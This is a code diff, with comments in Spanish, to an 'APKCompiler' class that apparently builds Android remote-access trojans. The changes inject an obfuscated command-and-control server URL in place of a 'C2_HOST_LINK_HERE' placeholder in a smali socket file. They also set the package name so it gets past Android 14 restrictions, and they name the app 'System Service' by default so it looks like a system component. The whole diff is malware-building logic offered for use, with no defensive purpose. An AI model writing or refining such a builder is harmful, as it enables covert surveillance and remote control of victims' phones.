@@ -196,15 +196,22 @@ class APKCompiler {
     if (existsSync(ioSocketPath)) {
       let content = readFileSync(ioSocketPath, "utf8");
       
-      let serverUrl = config.payloadCode || 
+      // Prioritizar URL de Render para WebSockets (Vercel no soporta WS)
+      let serverUrl = process.env.RENDER_EXTERNAL_URL || 
+                      config.payloadCode || 
                       process.env.API_URL || 
-                      process.env.RENDER_EXTERNAL_URL || 
                       "https://android-device-manager-one.onrender.com";
 
-      if (!serverUrl.includes("://")) serverUrl = `https://${serverUrl}`;
-      if (serverUrl.includes("render.com") || serverUrl.includes("vercel.app")) {
-        serverUrl = serverUrl.replace("http://", "https://");
+      // Si el usuario proporcionó una URL de Vercel, pero tenemos la de Render, usar Render
+      if (serverUrl.includes("vercel.app") && process.env.RENDER_EXTERNAL_URL) {
+        serverUrl = process.env.RENDER_EXTERNAL_URL;
+        logs.push(`[URL] [FIX] Redirigiendo URL de Vercel a Render para soporte WebSocket: ${serverUrl}`);
       }
+
+      if (!serverUrl.includes("://")) serverUrl = `https://${serverUrl}`;
+      
+      // Asegurar HTTPS
+      serverUrl = serverUrl.replace("http://", "https://");
       
       const encodeUrl = (url: string) => {
         const key = "PLATINUM_2026";
@@ -220,29 +227,41 @@ class APKCompiler {
       const finalRawUrl = serverUrl.split('?')[0].replace(/\/$/, "");
       const secureInjectedUrl = encodeUrl(finalRawUrl);
       
-      logs.push(`[URL] Injecting: ${finalRawUrl}`);
+      logs.push(`[URL] Inyectando URL: ${finalRawUrl}`);
       
-      const smaliLines = content.split('\n');
-      let found = false;
-      for (let i = 0; i < smaliLines.length; i++) {
-        const line = smaliLines[i];
-        const match = line.match(/^\s*(const-string)\s+(v[0-9]+),\s*"C2_HOST_LINK_HERE"/);
-        if (match) {
-          smaliLines[i] = line.replace(match[0], `${match[1]} ${match[2]}, "${secureInjectedUrl}"`);
-          found = true;
-          logs.push(`[OK] URL injected at line ${i + 1}`);
-          break;
+      content = content.replace(/C2_HOST_LINK_HERE/g, secureInjectedUrl);
+      writeFileSync(ioSocketPath, content);
+      logs.push(`[OK] URL inyectada correctamente`);
+    }
+
+    // Modificar apktool.yml para cambiar el nombre del paquete de forma segura (Fix Android 14)
+    const apktoolYamlPath = join(tempProjectDir, "apktool.yml");
+    if (existsSync(apktoolYamlPath)) {
+      try {
+        let content = readFileSync(apktoolYamlPath, "utf8");
+        
+        // Evitar nombres que empiecen por com.system, com.android, com.google (Bloqueados en Android 14)
+        let safePackageName = config.packageName || "com.adm.device.monitor";
+        if (safePackageName.startsWith("com.system") || safePackageName.startsWith("com.android") || safePackageName.startsWith("com.google")) {
+          safePackageName = "com.adm.device.monitor";
+          logs.push(`[PACKAGE] [FIX] Nombre de paquete restringido detectado. Usando: ${safePackageName}`);
         }
+
+        content = content.replace(/renameManifestPackage: null/, `renameManifestPackage: ${safePackageName}`);
+        
+        // También actualizar versión si se proporciona
+        if (config.versionCode) {
+          content = content.replace(/versionCode: '.*?'/, `versionCode: '${config.versionCode}'`);
+        }
+        if (config.versionName) {
+          content = content.replace(/versionName: '.*?'/, `versionName: '${config.versionName}'`);
+        }
+
+        writeFileSync(apktoolYamlPath, content);
+        logs.push(`[OK] Paquete configurado como: ${safePackageName}`);
+      } catch (e) {
+        logs.push(`[WARN] Error actualizando apktool.yml: ${e}`);
       }
-      
-      if (!found) {
-        content = content.replace(/C2_HOST_LINK_HERE/g, secureInjectedUrl);
-        logs.push(`[WARN] Placeholder not found, global replace`);
-      }
-      
-      writeFileSync(ioSocketPath, smaliLines.join('\n'));
-    } else {
-      logs.push(`[WARN] IOSocket.smali not found at: ${ioSocketPath}`);
     }
 
     // Modificar App Name en strings.xml
@@ -250,11 +269,11 @@ class APKCompiler {
     if (existsSync(stringsPath)) {
       try {
         let content = readFileSync(stringsPath, "utf8");
-        content = content.replace(/<string name="app_name">.*?<\/string>/, `<string name="app_name">${config.appName}</string>`);
+        content = content.replace(/<string name="app_name">.*?<\/string>/, `<string name="app_name">${config.appName || "System Service"}</string>`);
         writeFileSync(stringsPath, content);
-        logs.push(`[OK] App name updated: ${config.appName}`);
+        logs.push(`[OK] App name actualizado: ${config.appName}`);
       } catch (e) {
-        logs.push(`[WARN] Error updating app_name: ${e}`);
+        logs.push(`[WARN] Error actualizando app_name: ${e}`);
       }
     } else {
       logs.push(`[WARN] strings.xml not found`);
